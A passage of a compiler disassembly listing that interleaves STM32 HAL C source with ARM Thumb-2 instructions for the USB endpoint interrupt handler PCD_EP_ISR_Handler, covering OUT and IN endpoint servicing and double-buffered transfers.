 800280e:	b29b      	uxth	r3, r3
 8002810:	4313      	orrs	r3, r2
 8002812:	b29a      	uxth	r2, r3
 8002814:	697b      	ldr	r3, [r7, #20]
 8002816:	801a      	strh	r2, [r3, #0]
            PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);
 8002818:	687b      	ldr	r3, [r7, #4]
 800281a:	681b      	ldr	r3, [r3, #0]
 800281c:	881b      	ldrh	r3, [r3, #0]
 800281e:	b29b      	uxth	r3, r3
 8002820:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002824:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002828:	827b      	strh	r3, [r7, #18]
 800282a:	8a7b      	ldrh	r3, [r7, #18]
 800282c:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8002830:	827b      	strh	r3, [r7, #18]
 8002832:	8a7b      	ldrh	r3, [r7, #18]
 8002834:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002838:	827b      	strh	r3, [r7, #18]
 800283a:	687b      	ldr	r3, [r7, #4]
 800283c:	681a      	ldr	r2, [r3, #0]
 800283e:	8a7b      	ldrh	r3, [r7, #18]
 8002840:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002844:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002848:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800284c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002850:	b29b      	uxth	r3, r3
 8002852:	8013      	strh	r3, [r2, #0]
 8002854:	e22c      	b.n	8002cb0 <PCD_EP_ISR_Handler+0x76e>
    }
    else
    {
      /* Decode and service non control endpoints interrupt */
      /* process related endpoint register */
      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);
 8002856:	687b      	ldr	r3, [r7, #4]
 8002858:	681b      	ldr	r3, [r3, #0]
 800285a:	461a      	mov	r2, r3
 800285c:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002860:	009b      	lsls	r3, r3, #2
 8002862:	4413      	add	r3, r2
 8002864:	881b      	ldrh	r3, [r3, #0]
 8002866:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

      if ((wEPVal & USB_EP_CTR_RX) != 0U)
 800286a:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 800286e:	2b00      	cmp	r3, #0
 8002870:	f280 80f6 	bge.w	8002a60 <PCD_EP_ISR_Handler+0x51e>
      {
        /* clear int flag */
        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);
 8002874:	687b      	ldr	r3, [r7, #4]
 8002876:	681b      	ldr	r3, [r3, #0]
 8002878:	461a      	mov	r2, r3
 800287a:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 800287e:	009b      	lsls	r3, r3, #2
 8002880:	4413      	add	r3, r2
 8002882:	881b      	ldrh	r3, [r3, #0]
 8002884:	b29a      	uxth	r2, r3
 8002886:	f640 738f 	movw	r3, #3983	; 0xf8f
 800288a:	4013      	ands	r3, r2
 800288c:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8002890:	687b      	ldr	r3, [r7, #4]
 8002892:	681b      	ldr	r3, [r3, #0]
 8002894:	461a      	mov	r2, r3
 8002896:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 800289a:	009b      	lsls	r3, r3, #2
 800289c:	4413      	add	r3, r2
 800289e:	f8b7 2048 	ldrh.w	r2, [r7, #72]	; 0x48
 80028a2:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 80028a6:	b292      	uxth	r2, r2
 80028a8:	801a      	strh	r2, [r3, #0]
        ep = &hpcd->OUT_ep[epindex];
 80028aa:	f897 204d 	ldrb.w	r2, [r7, #77]	; 0x4d
 80028ae:	4613      	mov	r3, r2
 80028b0:	009b      	lsls	r3, r3, #2
 80028b2:	4413      	add	r3, r2
 80028b4:	00db      	lsls	r3, r3, #3
 80028b6:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80028ba:	687a      	ldr	r2, [r7, #4]
 80028bc:	4413      	add	r3, r2
 80028be:	657b      	str	r3, [r7, #84]	; 0x54

        /* OUT Single Buffering */
        if (ep->doublebuffer == 0U)
 80028c0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028c2:	7b1b      	ldrb	r3, [r3, #12]
 80028c4:	2b00      	cmp	r3, #0
 80028c6:	d123      	bne.n	8002910 <PCD_EP_ISR_Handler+0x3ce>
        {
          count = (uint16_t)PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 80028c8:	687b      	ldr	r3, [r7, #4]
 80028ca:	681b      	ldr	r3, [r3, #0]
 80028cc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80028d0:	b29b      	uxth	r3, r3
 80028d2:	461a      	mov	r2, r3
 80028d4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028d6:	781b      	ldrb	r3, [r3, #0]
 80028d8:	00db      	lsls	r3, r3, #3
 80028da:	4413      	add	r3, r2
 80028dc:	687a      	ldr	r2, [r7, #4]
 80028de:	6812      	ldr	r2, [r2, #0]
 80028e0:	4413      	add	r3, r2
 80028e2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80028e6:	881b      	ldrh	r3, [r3, #0]
 80028e8:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80028ec:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

          if (count != 0U)
 80028f0:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80028f4:	2b00      	cmp	r3, #0
 80028f6:	f000 808e 	beq.w	8002a16 <PCD_EP_ISR_Handler+0x4d4>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);
 80028fa:	687b      	ldr	r3, [r7, #4]
 80028fc:	6818      	ldr	r0, [r3, #0]
 80028fe:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002900:	6959      	ldr	r1, [r3, #20]
 8002902:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002904:	88da      	ldrh	r2, [r3, #6]
 8002906:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 800290a:	f005 fdda 	bl	80084c2 <USB_ReadPMA>
 800290e:	e082      	b.n	8002a16 <PCD_EP_ISR_Handler+0x4d4>
        }
#if (USE_USB_DOUBLE_BUFFER == 1U)
        else
        {
          /* manage double buffer bulk out */
          if (ep->type == EP_TYPE_BULK)
 8002910:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002912:	78db      	ldrb	r3, [r3, #3]
 8002914:	2b02      	cmp	r3, #2
 8002916:	d10a      	bne.n	800292e <PCD_EP_ISR_Handler+0x3ec>
          {
            count = HAL_PCD_EP_DB_Receive(hpcd, ep, wEPVal);
 8002918:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 800291c:	461a      	mov	r2, r3
 800291e:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002920:	6878      	ldr	r0, [r7, #4]
 8002922:	f000 f9d3 	bl	8002ccc <HAL_PCD_EP_DB_Receive>
 8002926:	4603      	mov	r3, r0
 8002928:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50
 800292c:	e073      	b.n	8002a16 <PCD_EP_ISR_Handler+0x4d4>
          }
          else /* manage double buffer iso out */
          {
            /* free EP OUT Buffer */
            PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 800292e:	687b      	ldr	r3, [r7, #4]
 8002930:	681b      	ldr	r3, [r3, #0]
 8002932:	461a      	mov	r2, r3
 8002934:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002936:	781b      	ldrb	r3, [r3, #0]
 8002938:	009b      	lsls	r3, r3, #2
 800293a:	4413      	add	r3, r2
 800293c:	881b      	ldrh	r3, [r3, #0]
 800293e:	b29b      	uxth	r3, r3
 8002940:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002944:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002948:	f8a7 3052 	strh.w	r3, [r7, #82]	; 0x52
 800294c:	687b      	ldr	r3, [r7, #4]
 800294e:	681b      	ldr	r3, [r3, #0]
 8002950:	461a      	mov	r2, r3
 8002952:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002954:	781b      	ldrb	r3, [r3, #0]
 8002956:	009b      	lsls	r3, r3, #2
 8002958:	441a      	add	r2, r3
 800295a:	f8b7 3052 	ldrh.w	r3, [r7, #82]	; 0x52
 800295e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002962:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002966:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800296a:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800296e:	b29b      	uxth	r3, r3
 8002970:	8013      	strh	r3, [r2, #0]

            if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX) != 0U)
 8002972:	687b      	ldr	r3, [r7, #4]
 8002974:	681b      	ldr	r3, [r3, #0]
 8002976:	461a      	mov	r2, r3
 8002978:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800297a:	781b      	ldrb	r3, [r3, #0]
 800297c:	009b      	lsls	r3, r3, #2
 800297e:	4413      	add	r3, r2
 8002980:	881b      	ldrh	r3, [r3, #0]
 8002982:	b29b      	uxth	r3, r3
 8002984:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002988:	2b00      	cmp	r3, #0
 800298a:	d022      	beq.n	80029d2 <PCD_EP_ISR_Handler+0x490>
            {
              /* read from endpoint BUF0Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 800298c:	687b      	ldr	r3, [r7, #4]
 800298e:	681b      	ldr	r3, [r3, #0]
 8002990:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002994:	b29b      	uxth	r3, r3
 8002996:	461a      	mov	r2, r3
 8002998:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800299a:	781b      	ldrb	r3, [r3, #0]
 800299c:	00db      	lsls	r3, r3, #3
 800299e:	4413      	add	r3, r2
 80029a0:	687a      	ldr	r2, [r7, #4]
 80029a2:	6812      	ldr	r2, [r2, #0]
 80029a4:	4413      	add	r3, r2
 80029a6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80029aa:	881b      	ldrh	r3, [r3, #0]
 80029ac:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80029b0:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 80029b4:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029b8:	2b00      	cmp	r3, #0
 80029ba:	d02c      	beq.n	8002a16 <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 80029bc:	687b      	ldr	r3, [r7, #4]
 80029be:	6818      	ldr	r0, [r3, #0]
 80029c0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029c2:	6959      	ldr	r1, [r3, #20]
 80029c4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029c6:	891a      	ldrh	r2, [r3, #8]
 80029c8:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029cc:	f005 fd79 	bl	80084c2 <USB_ReadPMA>
 80029d0:	e021      	b.n	8002a16 <PCD_EP_ISR_Handler+0x4d4>
              }
            }
            else
            {
              /* read from endpoint BUF1Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 80029d2:	687b      	ldr	r3, [r7, #4]
 80029d4:	681b      	ldr	r3, [r3, #0]
 80029d6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80029da:	b29b      	uxth	r3, r3
 80029dc:	461a      	mov	r2, r3
 80029de:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029e0:	781b      	ldrb	r3, [r3, #0]
 80029e2:	00db      	lsls	r3, r3, #3
 80029e4:	4413      	add	r3, r2
 80029e6:	687a      	ldr	r2, [r7, #4]
 80029e8:	6812      	ldr	r2, [r2, #0]
 80029ea:	4413      	add	r3, r2
 80029ec:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80029f0:	881b      	ldrh	r3, [r3, #0]
 80029f2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80029f6:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 80029fa:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029fe:	2b00      	cmp	r3, #0
 8002a00:	d009      	beq.n	8002a16 <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002a02:	687b      	ldr	r3, [r7, #4]
 8002a04:	6818      	ldr	r0, [r3, #0]
 8002a06:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a08:	6959      	ldr	r1, [r3, #20]
 8002a0a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a0c:	895a      	ldrh	r2, [r3, #10]
 8002a0e:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a12:	f005 fd56 	bl	80084c2 <USB_ReadPMA>
          }
        }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

        /* multi-packet on the NON control OUT endpoint */
        ep->xfer_count += count;
 8002a16:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a18:	69da      	ldr	r2, [r3, #28]
 8002a1a:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a1e:	441a      	add	r2, r3
 8002a20:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a22:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += count;
 8002a24:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a26:	695a      	ldr	r2, [r3, #20]
 8002a28:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a2c:	441a      	add	r2, r3
 8002a2e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a30:	615a      	str	r2, [r3, #20]

        if ((ep->xfer_len == 0U) || (count < ep->maxpacket))
 8002a32:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a34:	699b      	ldr	r3, [r3, #24]
 8002a36:	2b00      	cmp	r3, #0
 8002a38:	d005      	beq.n	8002a46 <PCD_EP_ISR_Handler+0x504>
 8002a3a:	f8b7 2050 	ldrh.w	r2, [r7, #80]	; 0x50
 8002a3e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a40:	691b      	ldr	r3, [r3, #16]
 8002a42:	429a      	cmp	r2, r3
 8002a44:	d206      	bcs.n	8002a54 <PCD_EP_ISR_Handler+0x512>
        {
          /* RX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataOutStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataOutStageCallback(hpcd, ep->num);
 8002a46:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a48:	781b      	ldrb	r3, [r3, #0]
 8002a4a:	4619      	mov	r1, r3
 8002a4c:	6878      	ldr	r0, [r7, #4]
 8002a4e:	f009 ff3d 	bl	800c8cc <HAL_PCD_DataOutStageCallback>
 8002a52:	e005      	b.n	8002a60 <PCD_EP_ISR_Handler+0x51e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002a54:	687b      	ldr	r3, [r7, #4]
 8002a56:	681b      	ldr	r3, [r3, #0]
 8002a58:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002a5a:	4618      	mov	r0, r3
 8002a5c:	f003 ffe3 	bl	8006a26 <USB_EPStartXfer>
        }
      }

      if ((wEPVal & USB_EP_CTR_TX) != 0U)
 8002a60:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002a64:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002a68:	2b00      	cmp	r3, #0
 8002a6a:	f000 8121 	beq.w	8002cb0 <PCD_EP_ISR_Handler+0x76e>
      {
        ep = &hpcd->IN_ep[epindex];
 8002a6e:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a72:	1c5a      	adds	r2, r3, #1
 8002a74:	4613      	mov	r3, r2
 8002a76:	009b      	lsls	r3, r3, #2
 8002a78:	4413      	add	r3, r2
 8002a7a:	00db      	lsls	r3, r3, #3
 8002a7c:	687a      	ldr	r2, [r7, #4]
 8002a7e:	4413      	add	r3, r2
 8002a80:	657b      	str	r3, [r7, #84]	; 0x54

        /* clear int flag */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);
 8002a82:	687b      	ldr	r3, [r7, #4]
 8002a84:	681b      	ldr	r3, [r3, #0]
 8002a86:	461a      	mov	r2, r3
 8002a88:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a8c:	009b      	lsls	r3, r3, #2
 8002a8e:	4413      	add	r3, r2
 8002a90:	881b      	ldrh	r3, [r3, #0]
 8002a92:	b29b      	uxth	r3, r3
 8002a94:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002a98:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002a9c:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8002aa0:	687b      	ldr	r3, [r7, #4]
 8002aa2:	681b      	ldr	r3, [r3, #0]
 8002aa4:	461a      	mov	r2, r3
 8002aa6:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002aaa:	009b      	lsls	r3, r3, #2
 8002aac:	441a      	add	r2, r3
 8002aae:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8002ab2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002ab6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002aba:	b29b      	uxth	r3, r3
 8002abc:	8013      	strh	r3, [r2, #0]

        if (ep->type == EP_TYPE_ISOC)
 8002abe:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ac0:	78db      	ldrb	r3, [r3, #3]
 8002ac2:	2b01      	cmp	r3, #1
 8002ac4:	f040 80a2 	bne.w	8002c0c <PCD_EP_ISR_Handler+0x6ca>
        {
          ep->xfer_len = 0U;
 8002ac8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aca:	2200      	movs	r2, #0
 8002acc:	619a      	str	r2, [r3, #24]

#if (USE_USB_DOUBLE_BUFFER == 1U)
          if (ep->doublebuffer != 0U)
 8002ace:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ad0:	7b1b      	ldrb	r3, [r3, #12]
 8002ad2:	2b00      	cmp	r3, #0
 8002ad4:	f000 8093 	beq.w	8002bfe <PCD_EP_ISR_Handler+0x6bc>
          {
            if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002ad8:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002adc:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002ae0:	2b00      	cmp	r3, #0
 8002ae2:	d046      	beq.n	8002b72 <PCD_EP_ISR_Handler+0x630>
            {
              PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002ae4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ae6:	785b      	ldrb	r3, [r3, #1]
 8002ae8:	2b00      	cmp	r3, #0
 8002aea:	d126      	bne.n	8002b3a <PCD_EP_ISR_Handler+0x5f8>
 8002aec:	687b      	ldr	r3, [r7, #4]
 8002aee:	681b      	ldr	r3, [r3, #0]
 8002af0:	627b      	str	r3, [r7, #36]	; 0x24
 8002af2:	687b      	ldr	r3, [r7, #4]
 8002af4:	681b      	ldr	r3, [r3, #0]
 8002af6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002afa:	b29b      	uxth	r3, r3
 8002afc:	461a      	mov	r2, r3
 8002afe:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002b00:	4413      	add	r3, r2
 8002b02:	627b      	str	r3, [r7, #36]	; 0x24
 8002b04:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b06:	781b      	ldrb	r3, [r3, #0]
 8002b08:	00da      	lsls	r2, r3, #3
 8002b0a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002b0c:	4413      	add	r3, r2
 8002b0e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002b12:	623b      	str	r3, [r7, #32]
 8002b14:	6a3b      	ldr	r3, [r7, #32]
 8002b16:	881b      	ldrh	r3, [r3, #0]
 8002b18:	b29b      	uxth	r3, r3
 8002b1a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b1e:	b29a      	uxth	r2, r3
 8002b20:	6a3b      	ldr	r3, [r7, #32]
 8002b22:	801a      	strh	r2, [r3, #0]
 8002b24:	6a3b      	ldr	r3, [r7, #32]
 8002b26:	881b      	ldrh	r3, [r3, #0]
 8002b28:	b29b      	uxth	r3, r3
 8002b2a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002b2e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002b32:	b29a      	uxth	r2, r3
 8002b34:	6a3b      	ldr	r3, [r7, #32]
 8002b36:	801a      	strh	r2, [r3, #0]
 8002b38:	e061      	b.n	8002bfe <PCD_EP_ISR_Handler+0x6bc>
 8002b3a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b3c:	785b      	ldrb	r3, [r3, #1]
 8002b3e:	2b01      	cmp	r3, #1
 8002b40:	d15d      	bne.n	8002bfe <PCD_EP_ISR_Handler+0x6bc>
 8002b42:	687b      	ldr	r3, [r7, #4]
 8002b44:	681b      	ldr	r3, [r3, #0]
 8002b46:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002b48:	687b      	ldr	r3, [r7, #4]
 8002b4a:	681b      	ldr	r3, [r3, #0]
 8002b4c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b50:	b29b      	uxth	r3, r3
 8002b52:	461a      	mov	r2, r3
 8002b54:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002b56:	4413      	add	r3, r2
 8002b58:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002b5a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b5c:	781b      	ldrb	r3, [r3, #0]
 8002b5e:	00da      	lsls	r2, r3, #3
 8002b60:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002b62:	4413      	add	r3, r2
 8002b64:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002b68:	62bb      	str	r3, [r7, #40]	; 0x28
 8002b6a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002b6c:	2200      	movs	r2, #0
 8002b6e:	801a      	strh	r2, [r3, #0]
 8002b70:	e045      	b.n	8002bfe <PCD_EP_ISR_Handler+0x6bc>
            }
            else
            {
              PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002b72:	687b      	ldr	r3, [r7, #4]
 8002b74:	681b      	ldr	r3, [r3, #0]
 8002b76:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002b78:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b7a:	785b      	ldrb	r3, [r3, #1]
 8002b7c:	2b00      	cmp	r3, #0
 8002b7e:	d126      	bne.n	8002bce <PCD_EP_ISR_Handler+0x68c>
 8002b80:	687b      	ldr	r3, [r7, #4]
 8002b82:	681b      	ldr	r3, [r3, #0]
 8002b84:	637b      	str	r3, [r7, #52]	; 0x34
 8002b86:	687b      	ldr	r3, [r7, #4]
 8002b88:	681b      	ldr	r3, [r3, #0]
 8002b8a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b8e:	b29b      	uxth	r3, r3
 8002b90:	461a      	mov	r2, r3
 8002b92:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002b94:	4413      	add	r3, r2
 8002b96:	637b      	str	r3, [r7, #52]	; 0x34
 8002b98:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b9a:	781b      	ldrb	r3, [r3, #0]
 8002b9c:	00da      	lsls	r2, r3, #3
 8002b9e:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002ba0:	4413      	add	r3, r2
 8002ba2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002ba6:	633b      	str	r3, [r7, #48]	; 0x30
 8002ba8:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002baa:	881b      	ldrh	r3, [r3, #0]
 8002bac:	b29b      	uxth	r3, r3
 8002bae:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002bb2:	b29a      	uxth	r2, r3
 8002bb4:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002bb6:	801a      	strh	r2, [r3, #0]
 8002bb8:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002bba:	881b      	ldrh	r3, [r3, #0]
 8002bbc:	b29b      	uxth	r3, r3
 8002bbe:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002bc2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002bc6:	b29a      	uxth	r2, r3
 8002bc8:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002bca:	801a      	strh	r2, [r3, #0]
 8002bcc:	e017      	b.n	8002bfe <PCD_EP_ISR_Handler+0x6bc>
 8002bce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bd0:	785b      	ldrb	r3, [r3, #1]
 8002bd2:	2b01      	cmp	r3, #1
 8002bd4:	d113      	bne.n	8002bfe <PCD_EP_ISR_Handler+0x6bc>
 8002bd6:	687b      	ldr	r3, [r7, #4]
 8002bd8:	681b      	ldr	r3, [r3, #0]
 8002bda:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002bde:	b29b      	uxth	r3, r3
 8002be0:	461a      	mov	r2, r3
 8002be2:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002be4:	4413      	add	r3, r2
 8002be6:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002be8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bea:	781b      	ldrb	r3, [r3, #0]
 8002bec:	00da      	lsls	r2, r3, #3
 8002bee:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002bf0:	4413      	add	r3, r2
 8002bf2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002bf6:	63bb      	str	r3, [r7, #56]	; 0x38
 8002bf8:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8002bfa:	2200      	movs	r2, #0
 8002bfc:	801a      	strh	r2, [r3, #0]

          /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataInStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002bfe:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c00:	781b      	ldrb	r3, [r3, #0]
 8002c02:	4619      	mov	r1, r3
 8002c04:	6878      	ldr	r0, [r7, #4]
 8002c06:	f009 fe7c 	bl	800c902 <HAL_PCD_DataInStageCallback>
 8002c0a:	e051      	b.n	8002cb0 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          /* Manage Single Buffer Transaction */
          if ((wEPVal & USB_EP_KIND) == 0U)
 8002c0c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002c10:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002c14:	2b00      	cmp	r3, #0
 8002c16:	d144      	bne.n	8002ca2 <PCD_EP_ISR_Handler+0x760>
          {
            /* multi-packet on the NON control IN endpoint */
            TxPctSize = (uint16_t)PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002c18:	687b      	ldr	r3, [r7, #4]
 8002c1a:	681b      	ldr	r3, [r3, #0]
 8002c1c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002c20:	b29b      	uxth	r3, r3
 8002c22:	461a      	mov	r2, r3
 8002c24:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c26:	781b      	ldrb	r3, [r3, #0]
 8002c28:	00db      	lsls	r3, r3, #3
 8002c2a:	4413      	add	r3, r2
 8002c2c:	687a      	ldr	r2, [r7, #4]
 8002c2e:	6812      	ldr	r2, [r2, #0]
 8002c30:	4413      	add	r3, r2
 8002c32:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002c36:	881b      	ldrh	r3, [r3, #0]
 8002c38:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002c3c:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40

            if (ep->xfer_len > TxPctSize)
 8002c40:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c42:	699a      	ldr	r2, [r3, #24]
 8002c44:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c48:	429a      	cmp	r2, r3
 8002c4a:	d907      	bls.n	8002c5c <PCD_EP_ISR_Handler+0x71a>
            {
              ep->xfer_len -= TxPctSize;
 8002c4c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c4e:	699a      	ldr	r2, [r3, #24]
 8002c50:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c54:	1ad2      	subs	r2, r2, r3
 8002c56:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c58:	619a      	str	r2, [r3, #24]
